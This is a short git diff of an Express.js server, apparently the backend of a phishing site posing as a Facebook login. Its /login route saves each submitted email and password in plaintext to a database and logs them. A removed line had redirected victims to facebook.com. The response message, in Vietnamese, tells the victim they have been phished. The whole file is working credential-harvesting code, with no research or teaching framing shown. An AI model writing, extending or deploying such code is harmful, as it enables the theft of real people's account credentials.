@@ -8,6 +8,7 @@ const port = 5001;
 app.use(express.json())
 
 
+
 // Set up Pug as the template engine
 app.set('view engine', 'pug');
 app.set('views', path.join(__dirname, 'views'));
@@ -25,13 +26,12 @@ app.get('/', (req, res) => {
 app.post("/login", async (req, res, next) => {
   const { email: username, password } = req.body
   if (!username || !password) return;
-  console.log("HIT", req.body)
+
+  console.log(req.body)
 
   await User.create({
     username, password
   })
-
-  res.redirect("https://www.facebook.com/")
 
   return res.status(200).json({
     message: "Ban da bi phishing hjhj",
